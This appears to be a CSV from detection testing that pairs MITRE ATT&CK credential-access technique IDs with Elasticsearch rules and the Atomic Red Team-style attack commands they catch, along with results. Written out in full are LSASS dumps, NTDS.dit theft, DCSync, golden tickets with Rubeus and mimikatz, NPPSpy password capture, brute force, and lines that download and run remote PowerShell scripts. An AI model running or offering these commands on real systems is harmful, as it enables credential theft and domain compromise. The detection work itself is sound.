T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""AADInternals*""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSCertificates""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
                        {""match_phrase"": {""CommandLine"": ""Where-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module AADInternals -Force; 
Export-AADIntADFSCertificates; 
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}; 
Write-Host ""`nCertificates retrieved successfully""",2,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*ActiveDirectory*""}},
                        {""wildcard"": {""CommandLine"": ""*AADInternals*""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ADObject""}},
                        {""match_phrase"": {""CommandLine"": ""System.Management.Automation.PSCredential""}},
                        {""match_phrase"": {""CommandLine"": ""Get-AADIntADUserNTHash""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSConfiguration""}},
                        {""wildcard"": {""CommandLine"": ""*ServiceSettingsData.PolicyStore.DkmSettings*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""[System.DirectoryServices.DirectorySearcher]""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSCertificates""}},
                        {""match_phrase"": {""CommandLine"": ""ConvertTo-SecureString""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module ActiveDirectory -Force ; 
Import-Module AADInternals -Force | Out-Null; 
$dcServerName = (Get-ADDomainController).HostName; 
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq ""#{adfs_service_account_name}""; 
$PWord = ConvertTo-SecureString -String ""#{replication_password}"" -AsPlainText -Force; 
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList;
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; 
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; 
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; 
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; 
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; 
$base = ""LDAP://CN=$group,$container,$parent""; 
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; 
$ADSearch.PropertiesToLoad.Clear(); 
$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null; 
$aduser = $ADSearch.FindOne(); 
$keyObjectGuid = $ADUser.Properties[""displayName""] ; 
$ADSearch.PropertiesToLoad.Clear(); 
$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null; 
$ADSearch.Filter=""(l=$keyObjectGuid)""; 
$aduser=$ADSearch.FindOne() ; 
$key=[byte[]]$aduser.Properties[""thumbnailphoto""][0] ; 
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; 
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}; 
Write-Host ""`nCertificates retrieved successfully""",2,
T1555.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                        {""match"": {""CommandLine"": ""Destination""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""Chrome\\User Data\\Default\\Login Data""}},
                        {""match_phrase"":{""CommandLine"": ""Opera Stable\\Login Data""}},
                        {""match_phrase"":{""CommandLine"": ""Firefox\\Profiles""}},
                        {""match_phrase"":{""CommandLine"": ""Microsoft\\Edge\\User Data\\Default""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination $env:temp; 
Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination $env:temp

Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination $env:temp

Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination $env:temp\Edge -Force -Recurse

Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination $env:temp -Force -Recurse",2,
T1555.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""/all""}}
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                                        {""wildcard"":{""CommandLine"": ""vaultcmd*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","vaultcmd /listcreds:""Windows Credentials""",2,
T1552.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""type*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Panther\\unattend.xml""}},
                        {""match_phrase"": {""CommandLine"": ""Panther\\Unattend\\unattend.xml""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","type C:\Windows\Panther\unattend.xml 
&& type C:\Windows\Panther\Unattend\unattend.xml",2,
T1110.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""System.DirectoryServices.Protocols*""}},
                        {""match_phrase"":{""CommandLine"": ""Get-Content -Path""}},
                        {""match"":{""CommandLine"": ""foreach""}},
                        {""match"":{""CommandLine"": ""try""}},
                        {""wildcard"":{""CommandLine"": ""*.bind""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {;
   Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported"";
   exit 1; }; 
[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null; 
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389); $passwordList = Get-Content -Path 5cb955_passwords.txt; 
foreach ($password in $passwordList){;
   $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"");
   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);
   try {;
     Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME."";
     $conn.bind();
     Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!"";
   } catch {;
     Write-Host $_.Exception.Message;
   };
 };
 Write-Host ""End of bruteforce""",2,
T1110.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""net use""}},
                        {""wildcard"": {""CommandLine"": ""*IPC""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""FOR*""}},
                        {""wildcard"": {""CommandLine"": ""user*""}},
                        {""wildcard"": {""CommandLine"": ""echo*""}}
      ],
       ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo Password1> passwords.txt 
&& echo 1q2w3e4r>> passwords.txt 
&& echo Password!>> passwords.txt 
&& echo Spring2022>> passwords.txt 
&& echo ChangeMe!>> passwords.txt 
&& @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\#{user}"" ""%p"" 1>NUL 2>&1 
&& @echo [*] #{user}:%p 
&& @net use /delete %logonserver%\IPC$ > NUL",2,
T1003.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""cmdkey /list""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cmdkey /list,2,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""C:\\Windows\\Temp""}},
                    {""match"": {""CommandLine"": ""copy""}},
                    {""wildcard"": {""CommandLine"": ""*NTDS.dit""}},
                    {""match_phrase"": {""CommandLine"": ""reg save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if not exist C:\Windows\Temp  ( call ) ELSE ( mkdir C:\Windows\Temp ) &&   
&&  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit 
&& copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE 
&& reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE",2（被45识别）,
T1558.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""rubeus.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""klist purge""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}},
                        {""match_phrase"": {""CommandLine"": ""ForEach-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Out-File""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""username*""}},
                        {""wildcard"": {""CommandLine"": ""logonserver*""}},
                        {""wildcard"": {""CommandLine"": ""userdnsdomain*""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; 
cmd.exe /c ""$Env:temp\rubeus.exe"" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"") /printcmd /outfile:golden; 
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name;
@""; >%TEMP%\golden.txt 2>&1 (;
   echo Purge existing tickets and create golden ticket:;
   klist purge;
   cd %temp%;
   ""$Env:temp\rubeus.exe"" ptt /ticket:kirbifile;
   echo.;
   echo Requesting SYSVOL:;
   dir \\$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"")\SYSVOL;   ;
   echo.;
   echo Tickets after requesting SYSVOL:;
   klist;
   echo.;
   echo End of Golden Ticket attack; );""
@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat; 
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null; 
do {;
   Start-Sleep 1;
   Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {;
     if ($_ -match 'End of Golden Ticket attack') { break } ;
   };
} while ($false); 
Get-Content $env:TEMP\golden.txt; 
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",2,
T1558.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Security.Principal.NTAccount""}},
                        {""match_phrase"": {""CommandLine"": ""mimikatz.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""klist purge""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}},
                        {""match_phrase"": {""CommandLine"": ""ForEach-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Out-File""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*userdnsdomain*""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; 
$domain_sid = ""S-1-5-21-DEFAULT""; 
If ($domain_sid -Match ""DEFAULT"") {;
   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;
   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;
   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'));
}; 
@""; >%TEMP%\golden.txt 2>&1 (;
   echo Purge existing tickets and create golden ticket:;
   klist purge;
   $env:TEMP\mimikatz\x64\mimikatz.exe ""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt"" ""exit"";
   echo.;
   echo Requesting SYSVOL:;
   dir \\%userdnsdomain%\SYSVOL;   ;
   echo.;
   echo Tickets after requesting SYSVOL:;
   klist;
   echo.;
   echo End of Golden Ticket attack; 
); ""
@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat; 
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null; 
do {;
   Start-Sleep 1;
   Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {;
     if ($_ -match 'End of Golden Ticket attack') { break } ;
   }; 
} while ($false); 
Get-Content $env:TEMP\golden.txt; 
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""procdump*""}},
                    {""match_phrase"": {""CommandLine"": ""lsass.exe""}},
                    {""wildcard"": {""CommandLine"": ""*.dmp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp

PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp",没日志,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                    {""wildcard"": {""CommandLine"": ""vssadmin*""}},
                    {""match_phrase"": {""CommandLine"": ""create shadow""}},
                    {""wildcard"": {""CommandLine"": ""mklink*""}}
            ],
            ""minimum_should_match"": 2
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","vssadmin.exe create shadow /for=C: 
&& mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

(Available only for Win7)",2,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""wmic*""}},
                    {""match_phrase"": {""CommandLine"": ""process call create""}},
                    {""wildcard"": {""CommandLine"": ""esentutl*""}},
                    {""wildcard"": {""CommandLine"": ""*ntds.dit""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""",2（被53识别）,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""wmic*""}},
                    {""match_phrase"": {""CommandLine"": ""shadowcopy call create""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""localhost"" shadowcopy call create Volume=C:\

wmic shadowcopy call create Volume=C:\",2(被53识别）,
T1003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""NPPSPY.dll""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty -Path""}},
                        {""match_phrase"": {""CommandLine"": ""Control\\NetworkProvider\\Order""}},
                        {""match_phrase"": {""CommandLine"": ""Set-ItemProperty -Path""}},
                        {""match_phrase"": {""CommandLine"": ""New-Item -Path""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                        {""match_phrase"": {""CommandLine"": ""-PropertyType ExpandString""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\NPPSpy""}}
      ],
            ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item ""$env:Temp\NPPSPY.dll"" -Destination ""C:\Windows\System32""; 
$path = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER; 
$UpdatedValue = $Path.PROVIDERORDER + "",NPPSpy""; 
Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue; 
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore; 
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Class"" -Value 2 -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Name"" -Value NPPSpy -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""ProviderPath"" -PropertyType ExpandString -Value ""%SystemRoot%\System32\NPPSPY.dll"" -ErrorAction Ignore; 
echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""",2,
T1552.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""reg*""}},
                          {""wildcard"": {""CommandLine"": ""REG_SZ""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""query HKCU""}},
                        {""match_phrase"": {""CommandLine"": ""query HKLM""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg query HKCU /f password /t REG_SZ /s

reg query HKLM /f password /t REG_SZ /s
  
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s",2,
T1003.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""mimikatz*""}},
                        {""wildcard"": {""CommandLine"": ""lsadump*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""domain*""}},
                        {""wildcard"": {""CommandLine"": ""user*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","%tmp%\mimikatz\x64\mimikatz.exe ""lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%"" ""exit""",2,
T1003.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""ntdsutil*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""ac i ntds""}},
                        {""match_phrase"": {""CommandLine"": ""\""ifm\""""}},
                        {""match_phrase"": {""CommandLine"": ""create full""}},
                        {""wildcard"": {""CommandLine"": ""snapshot*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","mkdir C:\Windows\Temp\ntds_T1003 
&& ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_T1003"" q q",2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""createdump*""}},
                    {""match_phrase"": {""CommandLine"": ""tasklist | findstr""}},
                    {""wildcard"": {""CommandLine"": ""lsass*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""Createdump Path C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe""; $LSASS = tasklist | findstr ""lsass""; 
$FIELDS = $LSASS -split ""\s+""; 
$ID = $FIELDS[1]; 
& ""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe"" -u -f C:\Windows\Temp\dotnet-lsass.dmp $ID",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""nanodump*""}},
                        {""wildcard"": {""CommandLine"": ""xordump*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","%temp%\nanodump.x64.exe -w ""%temp%\nanodump.dmp""

if (Test-Path 'C:\Windows\Temp\xordump.exe') { ;
 } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile C:\Windows\Temp\xordump.exe};  ;  
C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""get-process lsass""}},
                        {""match"": {""CommandLine"": ""MiniDump""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.ps1""}},
                        {""wildcard"": {""CommandLine"": ""*.dll""}},
                        {""wildcard"": {""CommandLine"": ""*.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); 
get-process lsass | Out-Minidump

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full",没日志（被拦截疑）,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Outflank-Dumpert.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe,2,
T1555,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                    {""match_phrase"": {""CommandLine"": ""Get-CredManCreds""}},
                    {""match_phrase"": {""CommandLine"": ""Get-PasswordVaultCredentials""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); 
Get-CredManCreds -Force

IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force",2,
T1003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-NetTCPConnection -LocalPort""}},
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-Process svchost""}},
                        {""wildcard"": {""CommandLine"": ""*.OwningProcess""}},
                        {""wildcard"": {""CommandLine"": ""*dump*""}},
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); 
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full",2,
T1003.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""PsExec*""}},
                    {""match_phrase"": {""CommandLine"": ""reg save""}},
                    {""match_phrase"": {""CommandLine"": ""security\\policy\\secrets""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y,2(被45识别),
T1558.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""System.IdentityModel""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                         {""match"": {""CommandLine"": ""-T""}},
                        {""match"": {""CommandLine"": ""-Q""}}
      ]
     }
    } ,
        {""bool"":{
          ""must"":[
                        {""wildcard"":{""CommandLine"": ""setspn*""}}
                    ]
     }
    },
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",setspn -T %USERDNSDOMAIN% -Q */*,2,
T1552.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"":{""CommandLine"": ""findstr""}},
                        {""match_phrase"": {""CommandLine"": ""select-string""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""pass*""}},        
                        {""wildcard"": {""CommandLine"": ""*.xml""}},
                        {""wildcard"": {""CommandLine"": ""*.doc""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""*.xls""}}
      ],
       ""minimum_should_match"": 1
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","findstr /si pass *.xml *.doc *.txt *.xls; 
ls -R | select-string -Pattern password",,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[         
                        {""match"":{""CommandLine"": ""foreach""}},
                        {""match_phrase"":{""CommandLine"": ""Get-ChildItem""}},
                        {""match_phrase"":{""CommandLine"": ""Where-Object""}},
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": "".key""}},
                        {""match"": {""CommandLine"": "".pgp""}},
                        {""match"": {""CommandLine"": "".gpg""}},
                        {""match"": {""CommandLine"": "".ppk""}},
                        {""match"": {""CommandLine"": "".p12""}},
                        {""match"": {""CommandLine"": "".pem""}},
                        {""match"": {""CommandLine"": "".pfx""}},
                        {""match"": {""CommandLine"": "".cer""}},
                        {""match"": {""CommandLine"": "".p7b""}},
                        {""match"": {""CommandLine"": "".asc""}},
                        {""match"": {""CommandLine"": "".crt""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","foreach($i in @("".key"","".pgp"","".gpg"","".ppk"","".p12"","".pem"","".pfx"","".cer"","".p7b"","".asc"","".crt"")){Get-ChildItem -Path c:\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match ""$i$""}}",3,
T1552.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Get-GPPPassword""}},
                    {""match"": {""CommandLine"": ""-Verbose""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",". PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1; 
Get-GPPPassword -Verbose",2,
T1552.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""findstr*""}},
                        {""match"": {""CommandLine"": ""/S""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*pass*""}},        
                        {""wildcard"": {""CommandLine"": ""*.xml""}},
                        {""wildcard"": {""CommandLine"": ""*.doc""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""sysvol*""}}
      ],
       ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
